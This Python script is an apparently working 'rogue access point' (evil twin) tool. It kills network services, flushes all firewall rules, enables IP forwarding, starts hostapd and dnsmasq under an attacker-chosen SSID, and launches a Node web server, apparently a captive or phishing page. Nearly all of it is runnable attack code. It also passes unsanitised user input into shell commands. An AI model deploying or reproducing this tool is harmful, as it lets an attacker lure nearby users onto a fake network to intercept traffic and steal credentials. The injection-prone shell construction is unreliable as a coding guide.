import os
import sys

# CONSTANTS:
DEV_NULL = ">/dev/null 2>&1"


### Reset network settings to their default
def reset_setting():
    ### Start system network service
    os.system('service NetworkManager start')
    ### Stop apache2 service
    os.system('service apache2 stop')
    ### Stop and kill the hostapd and dnsmasq services.
    os.system('service hostapd stop')  # hostapd (host access point daemon) for make access point
    os.system('service dnsmasq stop')  # dsnmasq is to make DNS and DHCP server
    os.system('service rpcbind stop')  # Remote Procedure Call bind
    os.system("killall dnsmasq " + DEV_NULL)
    os.system("killall hostapd " + DEV_NULL)
    ### Enable and start the local DNS stub listener that uses port 53
    os.system("systemctl enable systemd-resolved.service " + DEV_NULL)
    os.system("systemctl start systemd-resolved " + DEV_NULL)


### Setup the fake access point settings.
def fake_ap_on():
    ### Disable and stop the local DNS stub listener that uses port 53.
    os.system("systemctl disable systemd-resolved.service " + DEV_NULL)
    os.system("systemctl stop systemd-resolved " + DEV_NULL)
    # Kills the network management software and interfering processes left
    os.system("airmon-ng check kill " + DEV_NULL)
    os.system("killall dnsmasq " + DEV_NULL)
    os.system("killall hostapd " + DEV_NULL)
    set_ap_ip = "ifconfig " + interface + " 10.0.0.1 netmask 255.255.255.0"
    os.system(set_ap_ip)
    ### Define the default gateway.
    os.system('route add default gw 10.0.0.1')
    ### Enable IP forwarding (1 indicates to enable / 0 indicates to disable)
    # IP forwarding/Internet routing - is a process used to determine which path a packet or datagram can be sent.
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    ### Flush all chains - delete all of the firewall rules.
    # Chain is the set of rules that filter the incoming and outgoing data packets.
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    ### Allowing packets that routed through the system (=FORWARD) to pass through.
    os.system('iptables -P FORWARD ACCEPT')


### Link dnsmasq and hostapd to the configuration files. And Run the web server.
def run_fake_ap():
    # Link the dnsmasq to the configuration file.
    os.system('dnsmasq -C dnsmasq.conf')
    # Start the web server using a seperate terminal window
    os.system('gnome-terminal -- sh -c "node html/index.js"')
    # Link hostapd to the configuration file.
    os.system('hostapd hostapd.conf -B')
    os.system('route add default gw 10.0.0.1')


### Setting up configuration files:
# Create the hostapd and dnsmasq configuration files.	
def create_conf_files():
    command = "python3 create_conf_files.py " + interface + " " + ssid
    os.system(command)


### Delete the hostapd and dnsmasq configuration files (they were temp files).
def remove_conf_files():
    try:
        os.remove("dnsmasq.conf")
    except OSError:
        pass
    try:
        os.remove("hostapd.conf")
    except OSError:
        pass


if __name__ == "__main__":
    print("\nROGUE ACCESS POINT\n")

    ### Step 1: Choosing the interface to be used as the AP
    print("\nStep 1:  Choose the network interface which will run the fake AP:\n")
    empty = input("Press Enter to continue.........")
    # os.system('ifconfig')
    # nics_from_ifconfig()
    global interface
    interface = input("Please enter the interface name you want to use: ")

    # Reset all the setting
    reset_setting()

    global ssid
    # The name of the fake AP (terminal param)
    ssid = sys.argv[1]

    ### Step 2: Activate the fake AP
    print("\nStep 2:  Activation of the fake AP\n")
    empty = input("Press Enter to continue.........")
    fake_ap_on()
    create_conf_files()
    run_fake_ap()

    # Step 3: Deactivate the fake AP
    print("\nStep 3:  Deactivation of the fake AP\n")
    empty = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
    # print("\nRestoring network settings...\n")
    remove_conf_files()
    reset_setting()

    print("Network settings were successfully restored!.\nDone!")
